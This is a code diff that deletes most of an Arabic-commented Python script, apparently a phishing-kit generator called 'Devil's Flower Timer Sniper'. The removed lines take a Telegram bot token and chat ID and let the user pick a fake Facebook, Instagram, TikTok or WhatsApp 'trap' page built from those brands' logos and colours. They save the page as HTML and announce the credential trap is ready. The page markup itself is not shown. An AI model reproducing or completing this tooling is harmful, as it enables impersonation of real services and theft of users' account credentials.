@@ -1,43 +1,3 @@
-import os, time, sys
-
-# ألوان زهرة الشيطان
-G, R, W, B, C, Y = '\033[1;32m', '\033[1;31m', '\033[1;37m', '\033[1;34m', '\033[1;36m', '\033[1;33m'
-
-def show_banner():
-    os.system('clear')
-    print(f"""
-{R}             .,,uood888P^   {W}   _______
-{R}          .u888888888P'     {W}  /       \\
-{R}        .u888888888P'       {W} |  X   X  |
-{R}       u888888888P'         {W} |    ^    |
-{R}      u888888888P'          {W}  \\  ___  /
-{R}     u888888888P'           {W}   '-----'
-{R}     "888888888P'      {C}◎ ◎ ◎ DEVIL'S FLOWER ◎ ◎ ◎
-      "888888P'        {G}TIMER SNIPER V170 (PRO)
-        "88P'          {W}DEV: بحر اندرويد
-    {C}------------------------------------------
-    {B}[📱] Tele: {G}https://t.me/bavAhba
-    {B}[💬] WA  : {G}https://wa.me/201115442732
-    {C}------------------------------------------
-    """)
-
-show_banner()
-token = input(f"{C}[+] Bot Token: {G}")
-chat_id = input(f"{C}[+] Chat ID: {G}")
-
-# اختيار المنصة
-print(f"\n{Y}[!] اختر نوع الفخ:")
-print(f"{W}[1] فيسبوك  [2] إنستجرام  [3] تيك توك  [4] واتساب")
-choice = input(f"\n{C}[#] الاختيار: {G}")
-
-configs = {
-    "1": {"n": "Facebook", "c": "#1877f2", "i": "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"},
-    "2": {"n": "Instagram", "c": "#e1306c", "i": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg"},
-    "3": {"n": "TikTok", "c": "#000", "i": "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"},
-    "4": {"n": "WhatsApp", "c": "#25D366", "i": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"}
-}
-sel = configs.get(choice, configs["4"])
-
 # محتوى الـ HTML المطور مع التايمر
 html_content = f"""
 <!DOCTYPE html>
@@ -148,13 +108,3 @@ html_content = f"""
 </body>
 </html>
 """
-
-# الحفظ
-path = f"/storage/emulated/0/Download/Devil_V170_{sel['n']}.html"
-with open(path, "w", encoding="utf-8") as f:
-    f.write(html_content)
-
-print(f"\n\n{G}[✅] تم إنشاء فخ السحب مع التايمر بنجاح!")
-print(f"{W}📍 المسار: {B}{path}")
-print(f"{C}📍 المطور: {R}بحر اندرويد (زهرة الشيطان)")
-  
